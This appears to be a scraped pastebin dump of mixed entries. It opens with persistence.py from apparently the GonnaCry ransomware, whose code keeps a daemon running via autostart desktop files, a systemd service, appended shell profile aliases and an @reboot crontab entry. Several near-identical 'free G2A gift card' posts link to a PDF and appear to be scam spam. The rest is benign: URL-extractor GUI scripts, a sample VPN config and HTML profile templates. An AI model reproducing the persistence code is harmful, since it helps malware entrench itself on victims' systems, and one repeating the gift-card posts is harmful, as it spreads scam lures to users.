id,title,username,language,date,content
QYQMyijS,src/GonnaCry/persistence.py,FlyFar,Python,Wednesday 26th of June 2024 12:39:04 AM CDT,"import variables

import os
import subprocess
import shutil

def startup():
    desktop = \
'''[Desktop Entry]
Type=Application
Name=daemon
Exec={}
Icon=
Comment=SystemManagement
X-GNOME-Autostart-enabled=true
'''.format(variables.daemon_path)

    with open(variables.daemon_desktop, 'w') as f:
        f.write(desktop)

    startup_path = os.path.join(variables.home, '.config/autostart')
    try:
        os.mkdir(startup_path)
    except:
        pass

    shutil.copy2(variables.daemon_desktop, startup_path)


def systemctl():
    service = \
'''Description=daemon
Wants=network.target
After=syslog.target network-online.target
[Service]
Type=simple
ExecStart={}
Restart=on-failure
RestartSec=10
KillMode=process
[Install]
WantedBy=multi-user.target'''.format(variables.daemon_path)

    with open(variables.daemon_service, 'w') as f:
        f.write(service)

    try:
        shutil.copy2(variables.daemon_service, '/lib/systemd/system/daemon.service')
    except:
        pass
    
    commands = 'systemctl daemon-reload; systemctl enable daemon.service; \
        systemctl start daemon.service'
        
    os.system(commands)


def bashrcs():
    alias = ""alias 'daemon'='{}';\n"".format(variables.daemon_path)
    daemon = ""daemon;\n""

    paths = ['/etc/profile', '{}/.bash_profile', '{}/.bash_login',
             '{}/.profile', '{}/.bashrc']
    paths = [p.format(variables.home) for p in paths]

    for filepath in paths:
        try:
            with open(filepath, 'a') as f:
                f.write(alias)
                f.write(daemon)
        except:
            pass            


def crontab():
    command = '''(crontab -l 2>/dev/null; echo ""@reboot {}"") | crontab -'''.format(variables.daemon_path)
    os.system(command)
    
    "
0q3tFFzj,🤑G2A.com Free Gift Card FIX June 2024🎁,TeleBot,JavaScript,Wednesday 26th of June 2024 12:37:57 AM CDT,"G2A.com complimentary gift card & games guide.
Any gift card for free on G2A.com including Steam gift cards & everything else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872

Working as of:
June 24 2024

"
MATDgQD9,🤑G2A.com Free Gift Card FIX June 2024🤑,William95,JavaScript,Wednesday 26th of June 2024 12:31:53 AM CDT,"G2A.com free voucher & gaming guide.
Any gift card for free on G2A.com including Playstation gift cards & everything else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872

Working as of:
24th of June 2024

"
bGquG4rE,🤑G2A.com Free Gift Card FIX June 2024🎁,romikdikson,JavaScript,Wednesday 26th of June 2024 12:25:49 AM CDT,"G2A.com complimentary gift card & games guide.
Any item for free on G2A.com including Xbox gift cards & all else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872

Working as of:
June 24th 2024

"
gXWrZTQv,🤑G2A.com Free Gift Card FIX June 2024🎁,Justpit,JavaScript,Wednesday 26th of June 2024 12:19:47 AM CDT,"G2A.com complimentary voucher & games guide.
Any gift card for free on G2A.com including Xbox gift cards & anything else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872

Working as of:
24th of June 2024

"
TpEe1xSQ,🤑G2A.com Free Gift Card FIX June 2024🤑,DownloadPizza,JavaScript,Wednesday 26th of June 2024 12:13:43 AM CDT,"G2A.com free gift card & gaming guide.
Any item for free on G2A.com including Xbox gift cards & all else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872

Working as of:
June 24th 2024

"
vhQqRzCc,🤑G2A.com Free Gift Card FIX June 2024🤑,ROBLOX_PLSCHIL1O_O,JavaScript,Wednesday 26th of June 2024 12:07:40 AM CDT,"G2A.com free voucher & gaming guide.
Any voucher for free on G2A.com including Xbox gift cards & all else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872

Working as of:
June 24th 2024

"
3DaQ2D10,jsonconf,cronzph13,JSON,Tuesday 25th of June 2024 11:42:28 PM CDT,"{
  ""Countries"": [{
    ""flag_url"": ""us"",
    ""ovpnConfiguration"": ""s.ovpn"",
    ""serverName"": ""sample"",
    ""vpnPassword"": ""secret"",
    ""vpnUserName"": ""vpn""
  }]}"
Abeus8Uv,Extrac-Urls3.0.pyw,Najeebsk,Python,Tuesday 25th of June 2024 11:36:06 PM CDT,"import tkinter as tk
from tkinter import filedialog, messagebox, scrolledtext, ttk
import re
import subprocess

def browse_file():
    file_path = filedialog.askopenfilename(
        filetypes=[(""Text files"", ""*.txt""), (""All files"", ""*.*"")]
    )
    if file_path:
        entry_file_path.delete(0, tk.END)
        entry_file_path.insert(0, file_path)
        extract_urls(file_path)

def extract_urls(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
            content = file.read()
            urls = re.findall(r'(https?://\S+)', content)
            display_urls(urls)
    except Exception as e:
        messagebox.showerror(""Error"", f""Failed to read file: {e}"")

def display_urls(urls):
    search_text = entry_search.get().lower()
    text_urls.config(state=tk.NORMAL)
    text_urls.delete(1.0, tk.END)
    filtered_urls = [url for url in urls if search_text in url.lower()]
    for url in filtered_urls:
        text_urls.insert(tk.END, url + ""\n"")
    text_urls.config(state=tk.NORMAL)

def remove_duplicates():
    content = text_urls.get(1.0, tk.END).strip()
    urls = content.split('\n')
    unique_urls = list(dict.fromkeys(urls))
    text_urls.delete(1.0, tk.END)
    for url in unique_urls:
        text_urls.insert(tk.END, url + ""\n"")

def save_urls():
    urls = text_urls.get(1.0, tk.END).strip().split('\n')
    if urls:
        try:
            with open(""urls.txt"", 'w', encoding='utf-8') as file:
                for index, url in enumerate(urls):
                    if url:
                        channel_name = f""Channel{index + 1}""
                        file.write(f""{channel_name} {url}\n"")
                messagebox.showinfo(""Success"", ""URLs saved successfully to urls.txt."")
        except Exception as e:
            messagebox.showerror(""Error"", f""Failed to save file: {e}"")
    else:
        messagebox.showwarning(""No URLs"", ""No URLs to save."")

def open_vlc(event):
    try:
        index = text_urls.index(tk.CURRENT)
        line_start = f""{index.split('.')[0]}.0""
        line_end = f""{index.split('.')[0]}.end""
        url = text_urls.get(line_start, line_end).strip()
        if url:
            vlc_path = r""C:\Program Files\VideoLAN\VLC\vlc.exe""
            subprocess.Popen([vlc_path, url])
    except Exception as e:
        messagebox.showerror(""Error"", f""Failed to open VLC: {e}"")

def search_urls(event):
    file_path = entry_file_path.get()
    if file_path:
        extract_urls(file_path)
    else:
        messagebox.showwarning(""No File"", ""Please select a file first."")

# Create the main window
root = tk.Tk()
root.title(""Najeeb URL Extractor and Play VLC"")
root.configure(bg=""#4a4a4a"")
root.geometry(""740x680"")

# Apply style
style = ttk.Style()
style.theme_use('clam')
style.configure(""TFrame"", background=""#f0f0f0"")
style.configure(""TLabel"", background=""#f0f0f0"", foreground=""#333"")
style.configure(""TButton"", background=""#0052cc"", foreground=""white"")
style.map(""TButton"", background=[('active', '#003d99')])

# Create and place the widgets
frame = ttk.Frame(root, padding=10)
frame.pack(pady=10)

label_file_path = ttk.Label(frame, text=""File Path:"")
label_file_path.grid(row=0, column=0, padx=5, pady=5)

entry_file_path = ttk.Entry(frame, width=50)
entry_file_path.grid(row=0, column=1, padx=5, pady=5)

button_browse = ttk.Button(frame, text=""Browse"", command=browse_file)
button_browse.grid(row=0, column=2, padx=5, pady=5)

label_search = ttk.Label(frame, text=""Search URL:"")
label_search.grid(row=1, column=0, padx=5, pady=5)

entry_search = ttk.Entry(frame, width=50)
entry_search.grid(row=1, column=1, padx=5, pady=5)
entry_search.bind(""<KeyRelease>"", search_urls)

button_save = ttk.Button(frame, text=""Save URLs to File"", command=save_urls)
button_save.grid(row=0, column=3, pady=10)

button_remove_duplicates = ttk.Button(frame, text=""Remove Duplicates"", command=remove_duplicates)
button_remove_duplicates.grid(row=0, column=4, pady=10, padx=5)

text_urls = scrolledtext.ScrolledText(root, width=100, height=33, state=tk.NORMAL, bg=""#e6f2ff"")
text_urls.pack(padx=10, pady=10)
text_urls.bind(""<Double-1>"", open_vlc)

# Start the GUI event loop
root.mainloop()
"
racxVGH2,Extrac-Urls2.0.pyw,Najeebsk,Python,Tuesday 25th of June 2024 11:34:45 PM CDT,"import tkinter as tk
from tkinter import filedialog, messagebox, scrolledtext, ttk
import re
import subprocess

def browse_file():
    file_path = filedialog.askopenfilename(
        filetypes=[(""Text files"", ""*.txt""), (""All files"", ""*.*"")]
    )
    if file_path:
        entry_file_path.delete(0, tk.END)
        entry_file_path.insert(0, file_path)
        extract_urls(file_path)

def extract_urls(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
            content = file.read()
            urls = re.findall(r'(https?://\S+)', content)
            display_urls(urls)
    except Exception as e:
        messagebox.showerror(""Error"", f""Failed to read file: {e}"")

def display_urls(urls):
    text_urls.config(state=tk.NORMAL)
    text_urls.delete(1.0, tk.END)
    for url in urls:
        text_urls.insert(tk.END, url + ""\n"")
    text_urls.config(state=tk.NORMAL)

def remove_duplicates():
    content = text_urls.get(1.0, tk.END).strip()
    urls = content.split('\n')
    unique_urls = list(dict.fromkeys(urls))
    text_urls.delete(1.0, tk.END)
    for url in unique_urls:
        text_urls.insert(tk.END, url + ""\n"")

def save_urls():
    urls = text_urls.get(1.0, tk.END).strip().split('\n')
    channel_name_prefix = entry_channel_name.get().strip()
    if urls:
        try:
            with open(""urls.txt"", 'w', encoding='utf-8') as file:
                for index, url in enumerate(urls):
                    if url:
                        channel_name = f""{channel_name_prefix}{index + 1}""
                        file.write(f""{channel_name} {url}\n"")
                messagebox.showinfo(""Success"", ""URLs saved successfully to urls.txt."")
        except Exception as e:
            messagebox.showerror(""Error"", f""Failed to save file: {e}"")
    else:
        messagebox.showwarning(""No URLs"", ""No URLs to save."")

def open_vlc(event):
    try:
        index = text_urls.index(tk.CURRENT)
        line_start = f""{index.split('.')[0]}.0""
        line_end = f""{index.split('.')[0]}.end""
        url = text_urls.get(line_start, line_end).strip()
        if url:
            vlc_path = r""C:\Program Files\VideoLAN\VLC\vlc.exe""
            subprocess.Popen([vlc_path, url])
    except Exception as e:
        messagebox.showerror(""Error"", f""Failed to open VLC: {e}"")

# Create the main window
root = tk.Tk()
root.title(""Najeeb URL Extractor and Play VLC"")
root.configure(bg=""#4a4a4a"")
root.geometry(""740x640"")

# Apply style
style = ttk.Style()
style.theme_use('clam')
style.configure(""TFrame"", background=""#f0f0f0"")
style.configure(""TLabel"", background=""#f0f0f0"", foreground=""#333"")
style.configure(""TButton"", background=""#0052cc"", foreground=""white"")
style.map(""TButton"", background=[('active', '#003d99')])

# Create and place the widgets
frame = ttk.Frame(root, padding=10)
frame.pack(pady=10)

label_file_path = ttk.Label(frame, text=""File Path:"")
label_file_path.grid(row=0, column=0, padx=5, pady=5)

entry_file_path = ttk.Entry(frame, width=50)
entry_file_path.grid(row=0, column=1, padx=5, pady=5)

button_browse = ttk.Button(frame, text=""Browse"", command=browse_file)
button_browse.grid(row=0, column=2, padx=5, pady=5)

label_channel_name = ttk.Label(frame, text=""Channel Name Prefix:"")
label_channel_name.grid(row=1, column=0, padx=5, pady=5)

entry_channel_name = ttk.Entry(frame, width=50)
entry_channel_name.grid(row=1, column=1, padx=5, pady=5)

button_save = ttk.Button(frame, text=""Save URLs to File"", command=save_urls)
button_save.grid(row=1, column=2, pady=10)

button_remove_duplicates = ttk.Button(frame, text=""Remove Duplicates"", command=remove_duplicates)
button_remove_duplicates.grid(row=1, column=3, pady=10, padx=5)

text_urls = scrolledtext.ScrolledText(root, width=100, height=33, state=tk.NORMAL, bg=""#e6f2ff"")
text_urls.pack(padx=10, pady=10)
text_urls.bind(""<Double-1>"", open_vlc)

# Start the GUI event loop
root.mainloop()
"
jusjbg3R,Another Life - Example,meromerc,HTML,Tuesday 25th of June 2024 10:44:27 PM CDT,"<!--
    
    ANOTHER LIFE
    by meromercury
    
    accent color: primary
    ctrl + f to replace
    
    created and released 5/5/24
   
-->

<div class=""align-items-center"" style=""font-family:tahoma; font-size:12px;"">
    <div class=""container col-sm-6 p-0""><div class=""card"" style=""border-width:4px; box-shadow: 2px 2px 4px rgba(0,0,0,0.5)"">
        
        <div class=""card-header font-weight-bold text-primary justify-content-between p-0"" style=""font-size:15px;"">
            <div class=""p-1""><i class=""fa-solid fa-user fa-sm mx-1""></i>
            
            <!----- USERNAME ----->
            USER
            </div>
            <div><a href=""https://toyhou.se/meromercury"" class=""text-primary"" target=_blank><div class=""btn pull-right p-1"" style=""width:30px"" data-toggle=""tooltip"" title=""made by mero"">
            <i class=""fa-solid fa-code fa-sm""></i>
            </div></a></div>
        </div>
        
    <!--
    
    ABOUT THE IMAGE
    
    In the event you wanted to make the image wider too, i'll explain that first:
    
    Currently the inside of the main box is formatted into a row containing two columns, A and B.
    B, the right column with the text inside, is size 9 (col-9) meanwhile A, the left column with an image inside, is a plain column (""col"") and will adjust to match the size on the right. Bootstrap columns are sized from 1 to 12, so 12 - 9 = 3, meaning the left column is currently size 3.
    If you, say, wanted to make them equal, you'd need to change column B from ""col-9"" to ""col-6"" and column A would grow to match. Or maybe you want the image a big bigger but not much, so you could change ""col-9"" to ""col-8"".
    You can find these two columns marked below.
    
    Another thing (i think you know this already): if your image is smaller than the box, it will be stretched to match. if you'd like to keep it at its original size, you can remove the entire ""style"" tag below the image source, which is this: 
            style=""height:100%; width:100%""
    
    To center a smaller image, this is a two-step process (I have done these already in the code below to demonstrate):
    - add ""align-items-center"" to the left column line, like this:
            <div class=""col p-1 align-items-center"">
    
    - add "" class=""mx-auto"" "" to the image tag between the brackets, like this:
            <img src=""SOURCE"" class=""mx-auto"">
    
    I know that's a lot. I wanted to be thorough so you can adjust it to your liking. i hope that helps you somehow? and again you can ask if you have more questions or if i misinterpreted what you meant :D
    
    -->        
        <div class=""row no-gutters"">
            <!--- LEFT COLUMN A --->
            <div class=""col p-1"">
                
                <!-------
                IMAGE
                ------->
                <img src=""
                https://i.imgur.com/WjvSC0q.jpeg
                "" class=""mx-auto"" style=""height:100%; width: 100%"">
                
                <!---- end image ---->
            </div>
            
            <!--- RIGHT COLUMN B --->
            <div class=""col-9 text-muted"">
                <div class=""p-1 text-center"" style=""line-height:20px; font-size:11px; letter-spacing:0.04rem; height:30px; overflow:hidden;"">
                
                <!-------
                TEXT BOX 1:
                Use this for pronouns, age, pride flags, or whatever you want!
                
                You can technically make this box bigger too by adjusting the ""height"" above.
                ------->
                
                    pro/nouns
                    <span class=""mx-2"">•</span>
                    age
                    <span class=""mx-2"">•</span>
                    timezone

                <!----- END TEXT BOX 1 ----->
                </div>
                
                <hr class=""mt-0 mb-1"">
                
                <!-----------
                
                Below you can change the height to whatever you want, with (obviously) ""height:_px"". Default is 90.
                
                If you don't care about making the text box scroll, you can remove the ""height:_px"" line altogether, and then the container will grow to match the amount of text inside of the text box. (That also means the image will stretch to match, but you can change that too as i've mentioned above.)
                
                -------->
                
                <div class=""p-1 font-italic text-center table-responsive"" style=""height:180px; letter-spacing:0.04rem"">
                    			
                   <p>Electric Dreams is a 1984 science fiction romantic comedy film directed by Steve Barron (in his feature film directorial debut) and written by Rusty Lemorande. The film is set in San Francisco and depicts a love triangle among a man, a woman, and a personal computer. It stars Lenny Von Dohlen, Virginia Madsen, Maxwell Caulfield, and the voice of Bud Cort. </p>
                   
                   <p>The film was released in the United States in New York and Los Angeles on July 20, 1984, and in the United Kingdom in London on August 17, 1984. It received mixed reviews from critics.</p>
                   
                   <p>The soundtrack features music from prominent popular musicians of the time, being among the movies of this generation that actively explored the commercial link between a movie and its soundtrack. The soundtrack album Electric Dreams was re-issued on CD in 1998. The movie features music from Giorgio Moroder, Culture Club, Jeff Lynne (Electric Light Orchestra), and Heaven 17. During filming, Barron said, ""The fact that there's so much music has to do with the success of Flashdance. This film isn't Flashdance 2. Flashdance worked because of the dancing. It didn't have a story. Electric Dreams does.""</p>
                   
                    
                <!----- END TEXT BOX 2 ----->
                </div>
            </div>
        </div>
        <div class=""card-footer p-0 text-muted align-items-center justify-content-between"" style=""display:flex"">
        <div class=""align-items-center"">
            <div class=""melody-embed btn text-primary p-1"">
                    <iframe frameborder=""0"" style=""z-index:999;height:20px;width:35px;opacity:0.0001;position:absolute;""
                      
                      src=""https://www.youtube.com/embed/_F9IO9Plldc"">
                      <!-------
                      MUSIC PLAYER TUTORIAL
                      
                      1. in the link to your youtube video, copy everything after watch?v=
                      2. replace the jumble of letters after /embed/ with what you just copied
                      
                      remember to keep the ""QUOTATION MARKS"" around the entire link or else it could break.
                      ------->
                     </iframe>
                <i class=""fa-solid fa-play-pause mx-2""></i>
              </div>
            <span class=""text-primary"">Now Playing:</span></div>
            
            <div class=""fa-fade font-italic pull-right p-1 mr-1"" style=""letter-spacing:0.04rem; text-shadow: 2px 2px 4px rgba(0,0,0,0.5)"">
            <!----- SONG TITLE ----->
            BROWSER HISTORY . . . Graham Kartna
            </div>
        </div>
    </div>
</div></div>"
FJjr4hpG,De Esmeray,Kelly-B9978,HTML,Tuesday 25th of June 2024 10:31:29 PM CDT,"<link href=""https://dl.dropbox.com/scl/fi/k5v5k6ykhj3w0imhriggr/esmeray.css?rlkey=haim5996m4luk7n0kk2avxw4y&st=qycx25i8"" rel=""stylesheet"">
<div id=""zzzcode""><a href=""https://discord.com/users/625292873914515456/""></a><div class=""esmeray-box"">
<div class=""esmeray-top""></div><div class=""esmeray-logo""></div><div class=""esmeray-ripped""></div><div class=""esmeray-paper""><div class=""esmeray-title-glow""></div>
<div class=""esmeray-title"">
<div class=""esmeray-butterfly""><img src=""https://i.imgur.com/pbI8HoN.png""></div>
<div class=""esmeray-title-name"">de esmeray</div>
<div class=""esmeray-subtitle-name"">of flozentine</div></div>
<br><div class=""esmeray-content"">
<p>เดอ เอสเมอเรย์ คฤหาสน์หลังเล็กของสองแม่มดตระกูลฟลอเซนไทน์ที่เต็มไปด้วยพลังแห่งมนตรา ลุยซ่า เบียทริกซ์ ฟลอเซนไทน์ ผู้นำจิตวิญญาณมนตรา และ เลทิเซีย บรีแอนน่า ฟลอเซนไทน์ ลูกพี่ลูกน้องของเธอ ภายในบริเวณจะได้กลิ่นหอมหวานของบุปผานานาชนิด และกลิ่นของน้ำชายามบ่ายอันหอมกรุ่นพร้อมทั้งกลิ่นขนมที่เพิ่งอบเสร็จใหม่ ๆ</p>
<br>
<p>คฤหาสน์หลังนี้ถูกสร้างขึ้นในปี 1961 มีความสูงสามชั้น ตั้งอยู่ในย่านชุมชนก่อนที่จะถูกทิ้งร้างเอาไว้จนสองพี่น้องฟลอเซนไทน์เข้ามาเป็นเจ้าของ เดอ เอสเมอเรย์ ถูกล้อมรอบด้วยทิวสนแทนรั้ว ด้านหน้าตัวคฤหาสน์มีสวนดอกไม้ที่ทำให้บรรยากาศสดใส อบอุ่น ด้านข้างยังมีศาลาหลังเล็กไว้สำหรับจิบน้ำชาอีกด้วย เมื่อไหร่ที่มีลมพัดกลีบดอกไม้จะร่วงลงมาทำให้มีทิวทัศน์ที่สวยงามเป็นอย่างมาก ว่ากันว่าข้างในคฤหาสน์หลังนี้นั้น เต็มไปด้วยความลับมากมายที่แสนลึกลับและเหนือจินตนาการ แต่บ้างก็ว่าแม่มดจากตระกูลฟลอเซนไทน์ทั้งสองใช้ทำสิ่งลึกลับบางสิ่งบางอย่าง</p></div>
<div class=""esmeray-member-flex"">
<a href=""https://roleplayth.com/member.php?action=profile&uid=261"" class=""esmeray-member-side"" style=""--esmeray-pic: url(https://i.imgur.com/QSVp3bF.png);""><div class=""esmeray-member-name"">Letisia</div></a>
<a href=""https://roleplayth.com/member.php?action=profile&uid=5"" class=""esmeray-member-center"" style=""--esmeray-pic: url(https://i.imgur.com/L9oGpCW.png);""><div class=""esmeray-member-name"">Louisa</div></a>
<a href=""https://roleplayth.com/member.php?action=profile&uid=37"" class=""esmeray-member-side"" style=""--esmeray-pic: url(https://i.imgur.com/qYQfhKD.png);""><div class=""esmeray-member-name"">Bethany</div></a>
</div>
<br><br><br><div class=""esmeray-bottom""></div>
</div></div></div>
[dh=display: none;][ytauto=rxBwgwDplpI][/ytauto][/dh]"
